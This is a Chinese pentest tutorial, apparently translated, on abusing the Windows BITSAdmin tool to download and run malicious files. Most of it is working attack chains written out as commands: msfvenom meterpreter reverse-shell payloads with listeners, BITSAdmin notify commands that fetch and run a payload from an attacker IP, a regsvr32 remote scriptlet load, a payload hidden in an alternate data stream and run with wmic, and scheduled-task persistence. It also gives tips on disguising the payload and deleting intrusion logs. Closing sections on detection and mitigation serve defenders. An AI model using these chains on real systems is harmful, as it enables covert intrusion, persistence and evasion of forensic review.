BITSAdmin是Windows操作系统上原有的工具，可被用于下载恶意文件。

BITSAdmin介绍

Background Intelligent Transfer Service Admin（BITSAdmin） 是一个命令行工具，可以创建下载或上传文件并监控其进度。BITSAdmin是与windows xp一起发布的。当时，它使用IBackgroundCopyJob作为其接口。Windows Server 2003发行版引入了BITSAdmin的Upload（上传）选项。随着Windows Vista发行版，具有了更多的其他的功能。例如：自定义HTTP标头，基于证书的客户端身份验证，IPv6支持。再Windows Server 2008的中引入了文件传输通知功能（在下面的例子中会使用它来运行可执行文件）。Win 7引入了用BITSAdmin传输缓存功能。当BITS下载文件时，实际下载是在svchost.exe服务中进行的。BITSAdmin用于从HTTP Web服务器和SMB文件共享下载文件或将文件上传到HTTP Web服务器和SMB文件共享。它考虑了传输成本以及网络使用情况，因此不会影响用户的前台工作。即使重新启动，BITS具有处理网络中断，暂停和自动恢复传输的能力。

实验环境：

Kali linux 2019.4，Windows 10 1909家庭中文版 build 18363和Win10 专业版 build 16299。
注意：使用家庭中文版使用BITSAdmin时，Windows Defender不会阻止提示。但是如果操作的路径没有权限时会提示拒绝访问。使用专业版时，windows Defender会拦截并提示。关闭Defender的实时保护时可以正常运行。以下的演示使用win10 build 18363.但是只要运行BITSAdmin，360安全卫士就会提示，并阻止运行。

BITSAdmin的使用

前面已经提到了BITSAdmin可以用来下载文件。BITSAdmin有两个参数/transfer和/addfile两个参数用来下载文件。这两个参数的工作方式完全相同。但是这些参数表现的下载进度和反馈的方式是不同的。BITSAdmin以任务形式下载文件。在下载之后可以使用各种参数进行下一步的工作。操作的路径必须要有相关的权限。

一、使用transfer参数下载

transfer参数是从远程服务器下载到本机的简单便捷的方法。需要定义传输任务的名称，可以是任何名字。
在示例中，将所有的传输任务定义为hackingarticles,原文中都定义为hackingarticles，我自己实验的任务名为whitehat_day。在定义名称后需要输入远程服务器文件名的位置。在远程服务器上有一个名为ignite.png的示例图像文件。需要本地的路径和名称。如下：
bitsadmin /transfer hackingarticles http://192.168.1.13/ignite.png c:\ignite.png

二、复制本地文件

BITSAdmin遵循文件传输的原则。因此，可以将其用作复制和粘贴命令。这意味着BITSAdmin也能将同一台计算机上的一个位置传输到另一个位置。
现在使用BITSAdmin创建一个whitehat_day的任务。
bitsadmin /create whitehat_day
使用/addfile参数将传输文件添加到whitehat_day任务中，并声明传输的文件名与路径，和保存位置与名称。
bitsadmin /addfile whitehat_day d:\file.txt d:\testfile.txt
现在可以使用/resume参数来开启传输。
bitsadmin /resume whitehat_day
传输开始，他以临时文件的形式传输文件。要获取完整的文件，需要使用/complete参数。
bitsadmin /complete whitehat_day
现在查看目标路径下是否存在file.txt。发现存在该文件。
Get-ChildItem -Path d:\

三、使用PowerShell Cmdlet下载

上面的命令也可以在CMD下运行。在Windows Server 2016的发布，Microsoft发布了一个专门用于PowerShell的cmdlet作为客户端来管理BITS的任务。它被命名为Start-BITSTransfer。
Start-BitsTransfer -Source http://localhost/copy.png -Destination d:\copy.png
使用此cmdlet进行传输，不需要提及作业的名称。只需要源和目标。如下图：

注意：如果进行渗透测试时，我们只能得到PowerShell权限，而不能正常使用BITSAdmin，则可以使用此方法。

四、使用一行命令完成下载

利用管道符，可以使用BITSAdmin在一行命令中完成文件下载。如下：
bitsadmin /create whitehat_day | bitsadmin /transfer whitehat_day http://localhost/copy.png d:\ignite.png | bitsadmin /resume whitehat_day | bitsadmin /complete whitehat_day

五、在实战中配合msf远程下载文件并执行

在kali上使用msfvenom创建payload，使用如下命令：
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.106 lport=1234 -f exe > /var/www/html/payload.exe
本地启动apache2服务，使payload可被远程访问
service apache2 restart

运行监听程序，使用该监听器捕获会话。
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.13
set lport 1234
run

下载使用BITSAdmin下载payload并运行payload。首先创见一个名为“whitehat_day”的任务名，然后将payload文件添加到刚刚建立的任务中。
bitsadmin /create whitehat_day
bitsadmin /addfile whitehat_day http://192.168.0.106/payload.exe d:\payload.exe
添加文件后，使用/SetNotifyCmdLine参数执行有效负载。下面的命令将启动cmd.exe，然后完成下载payload，在就是在后台执行payload。
bitsadmin /SetNotifyCmdLine whitehat_day cmd.exe "/c bitsadmin.exe /complete whitehat_day | start /B d:\payload.exe"
运行下面的命令将启动上面的命令
bitsadmin /resume whitehat_day
然后在kali上发现获得了会话。执行sysinfo获取系统信息。
sysinfo

六、通过下载图片的方式隐藏加载payload

使用Metasploit Framework的web_delivery Exploit功能生成无文件的payload，如下图：
use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp
选择目标3（Regsvr32），它会生成一小段命令，执行命令就可以获取meterpreter会话。
set target 3
set lhost 192.168.0.106
run

BITSAdmin被设计为仅在下载完成时运行命令。由于BITSAdmin旨在下载windows update，因此也可以使用其他格式的文件。在这里使用无害的png图像文件。
bitsadmin /create whitehat_day
bitsadmin /addFile whitehat_day http://192.168.0.106/image.png d:\image.png
提那件文件后，我们将使用/SetNotifyCmdLine执行regsvr32.exe,然后使用regsvr32.exe执行web_delivery创建的命令，然后返回会话。
bitsadmin /SetNotifyCmdLine whitehat_day regsvr32.exe "/s /n /u /i:http://192.168.0.106:8080/ YDgG5m.sct scrobj.dll"
最后使用BITSAdmin让其正常工作。
bitsadmin /resume whitehat_day
如下所示，kali获得了会话。

注意：在执行完之后会有错误的提示。Win7与win10都会提示错误。但是还是能回连的，但是不稳定。如下所示：

sessions -i 1
sysinfo

这是一种隐秘的方法，因为没有文件与我们获得的会话相关联。但是使用正确的技术可以更加的隐秘。

七、在ADS内部隐藏恶意可执行文件。

之前的文章中，介绍过数据流。因此我们使用隐藏在数据流中的有效负载来会连kali。
开始像在实验5中一样使用msfvenom创建一个恶意的可执行有效payload。
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.13 lport=1234 -f exe > /var/www/html/payload.exe
service apache2 restart
创建监听器。
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.13
set lport 1234
run
创建任务，并为任务增加文件
bitsadmin /create hackingarticles
bitsadmin /addfile hackingarticles http://192.168.1.13/payload.exe C:\payload.exe
使用参数/SetNotifyCmdLine读取有效负载的内容，并将该负载下载传输到file.exe的备用数据流中。
bitsadmin /SetNotifyCmdLine hackingarticles cmd.exe "/c type C:\paylaod.exe > C:\file.txt:payload.exe"
使用/resume参数执行任务
bitsadmin /resume hackingarticles
使用Get-item列出file数据流中的内容，发现有效负载文件已成功传输到该文件的ADS中。
Get-item -Path C:\file -stream *

现在执行ADS中的有效负载。使用wmic执行。
wmic process call create "c:\file.txt:payload.exe"

返回上图所示，说明执行成功。
同样kali获取了有效会话。执行sysinfo来获取目标系统信息。
sysinfo

八、使用BITSAdmin进行持久化

使用实践5中一样创建payload和监听器。
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.13 lport=1234 -f exe > /var/www/html/payload.exe
service apache2 restart
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.13
set lport 1234
run
创建任务
bitsadmin /create hackingarticles
增加需要下载的文件
bitsadmin /addfile hackingarticles http://192.168.1.13/payload.exe C:\payload.exe
使用
bitsadmin /SetNotifyCmdLine hackingarticles cmd.exe "/c bitsadmin.exe /complete hackingarticles | start /B C:\payload.exe"
然后使用/SetMinRetryDelay参数。它用于设置BITS遇到短暂错误后再尝试传输文件之前等待的最短时间（以秒为单位）。如果BITS已经完成下载，但是由于瞬时错误而无法运行。则此函数可以设置其在120秒后重试下载新文件。
bitsadmin /SetMinRetryDelay hackingarticles 120
BITS可能会进入错误状态，并在未完成下载的情况下将有效负载保持在临时状态，进而导致有效负载的执行停止。为了解决这个问题，我们将使用schtasks在特定的时间一次又一次的恢复工作。这将使得有效负载得以持续运行。
schtasks /create /tn hackingarticles /tr "C:\system32\bitsadmin.exe /resume hackingarticles" /sc minute /mo 60
如果schtasks中的/resume参数进入错误状态，他将重新启动BITS任务。使用计划任务参数/mo使任务每隔60分钟重新激活。如果发生错误，BITSAdin将重新下载有效负载，并在计算机重新启动时，schtasks会执行有效负载。
schtasks /run /tn hackingarticles

现在kali上已经获得会话。执行sysinfo获取系统信息
sysinfo

注意：在实际场景中，请将有效负载重命名为Windows Update。并在%Temp%目录中执行所有任务。建议修改schtasks在特定的时间后删除任务，并通过删除与此次入侵相关的日志。

BITS监控

在Windows Defender实时扫描中正式引入BITSAdmin之前，很难检测到BITS传输。除了浏览日志外，没有其他方法。监控日志了解BITSAdmin工具的使用情况（尤其时Transfer，Create，AddFile，SetNotifyFlags，SetNotifyCmdLine，SetMinRetryDelay,SetCustomHeaders和Resume参数的使用情况）是一种获取相关入侵信息的方法。

SC查询

BITSAdin被部署为服务。因此，可以使用SC Query Utility检查其状态。
sc query bits

这将显示是否存在任何正在运行的BITS传输的实例。

QMFR数据库中的记录

它是队列管理数据库的缩写形式。这是所有BITS任务的记录。在此数据库中记录生成了两种文件类型。.dat文件和.db文件。可以在此位置找到该数据库文件
C:\ProgramData\Microsoft\Network\Downloader\
使用dir命令遍历上述位置，可以找到一个qmgr.db文件。因为其是十六进制编码的文件。使用Hex-Editor Online工具打开文件。发现记录了下载文件的IP地址及其路径。它提供了在使用/complete参数之前下载的临时文件。


注意：BITS任务将不会显示在自动运行中，因为在使用默认配置启动时无法以任何方式运行BITSAdmin。

info参数使用介绍：

在实战中可以运行BITSAdmin，那么可以获取一些非常有用的信息。运行一个BITS任务，并运行下面的命令可以获取有关该任务的信息。
bitsadmin /info hackingarticles /verbose

事件记录中的记录

Windows事件日志中会记录BITS传输任务的下载状态，下载源，用户和一些文件信息。它被称为Microsoft-Windows-BITS-Client / Operational日志。在win7与win10上，此事件日志非常相似，因此它是一个很好的信息收集源。这里有些限制，因为这些日志不显示稀疏数据，而且日志分散在多个EventID上。在任何环境中，潜在的大量日志都可能使恶意下载不容易被发现。除非配置任务将文件传输到可疑目录中，否则此日志也不会检测到BITS持久性。
可以在以下的位置的事件查看器上看待此日志。
Application and Services Logs > Microsoft > Windows > BITS-Client

防范

建议修改网络和主机防火墙规则以及其他网络控件，使其仅允许合法的BITS通信。还可以通过组策略或通过编辑HKEY_LOCAL_MACHINE \ Software \ Policies \ Microsoft \ Windows \ BITS中的“ JobInactivityTimeout ”和“ MaxDownloadTime ”注册表值来减少默认的BITS任务执行时间。BITS任务的默认的最大时间为90天，但是可以修改。最后可以将BITSAdmin界面的访问权限限制为特定用户或组。

结论

这种攻击在现实生活中经常发生。针对不同办公环境的多个事件，已检测到并删除了恶意文件，但使用BITSAdmin可以再次将其恢复。
